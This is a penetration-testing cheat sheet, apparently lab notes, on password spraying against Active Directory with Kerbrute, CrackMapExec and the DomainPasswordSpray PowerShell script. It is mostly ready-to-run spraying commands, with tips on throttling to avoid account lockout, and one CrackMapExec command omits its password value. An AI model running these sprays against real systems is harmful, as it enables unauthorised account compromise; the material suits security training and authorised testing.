# Password Spraying

## Password Spraying from Linux

#### Using Kerbrute

* `dollarboysushil@kali[dbs]$ kerbrute passwordspray -d marvel.local --dc 192.168.1.1 users_list.txt P@ssw0rd`

#### Using Crackmapexec

* `dollarboysushil@kali[dbs]$ sudo crackmapexec smb 192.168.1.1 -u users_list.txt -p --continue-on-success`

#### Local Admin Spraying with CrackMapExec

Local admin spraying is a technique used to check if a given set of credentials has local administrator access on multiple machines in a network.

1. **CrackMapExec Local Admin Check**
   *   **Command:**

       ```bash
       crackmapexec smb {IP-Range} -u {Username} -p {Password} --local-auth
       ```
   * **Description:** Checks if the provided username and password have local administrator privileges on the specified IP range. The `--local-auth` flag specifies that the provided credentials are local accounts on each target machine.
2. **Using a List of Credentials**
   *   **Command:**

       ```bash
       crackmapexec smb {IP-Range} -u {Usernames-File} -p {Passwords-File} --local-auth
       ```
   * **Description:** Uses a file containing multiple usernames and passwords to spray against the specified IP range, checking for local administrator access.
3. **Password Spraying with Known Username**
   *   **Command:**

       ```bash
       crackmapexec smb {IP-Range} -u {Username} -p {Password-List} --local-auth
       ```
   * **Description:** Performs password spraying using a known username and a list of passwords against the IP range to check if any of them provide local administrator access.
4. **Specifying a Domain**
   *   **Command:**

       ```bash
       crackmapexec smb {IP-Range} -d {Domain-Name} -u {Username} -p {Password} --local-auth
       ```
   * **Description:** Checks for local admin access on machines within a specified domain using the provided credentials.
5. **Additional Options**
   * **`--continue-on-success`**: Continue spraying even if successful credentials are found.
   * **`--threads {Number}`**: Specify the number of threads for concurrent connections.

#### Example Commands

*   **Basic Local Admin Check:**

    ```bash
    crackmapexec smb 192.168.1.0/24 -u admin -p Password123 --local-auth
    ```

## Local Admin Spraying from Windows

Local admin spraying can also be performed on a Windows machine using PowerShell scripts such as [`DomainPasswordSpray.ps1`](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1). This script allows for password spraying across multiple machines within a domain to check for valid credentials.

1. **Using `DomainPasswordSpray.ps1`**
   *   **Step 1:** Import the PowerShell module.

       ```powershell
       PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
       ```
   *   **Step 2:** Invoke the password spraying command.

       ```powershell
       PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
       ```
   * **Description:** This command sprays the password "Welcome1" across the domain, logging any successful login attempts to the `spray_success` file. The `-ErrorAction SilentlyContinue` flag suppresses errors to keep the output clean.
2. **Specifying Additional Parameters**
   * **`-UserList {Path}`:** Use a file containing a list of usernames to spray against.
   * **`-Domain {Domain}`:** Specify the domain name if different from the default context.
   * **`-Throttle {Milliseconds}`:** Add a delay between attempts to avoid account lockout policies.
   *   **Example Command:**

       ```powershell
       PS C:\htb> Invoke-DomainPasswordSpray -UserList C:\users.txt -Password Welcome1 -Domain MYDOMAIN -OutFile spray_success -Throttle 500 -ErrorAction SilentlyContinue
       ```

#### Example Commands

*   **Basic Password Spray:**

    ```powershell
    PS C:\htb> Invoke-DomainPasswordSpray -Password Password123 -OutFile success_log.txt -ErrorAction SilentlyContinue
    ```
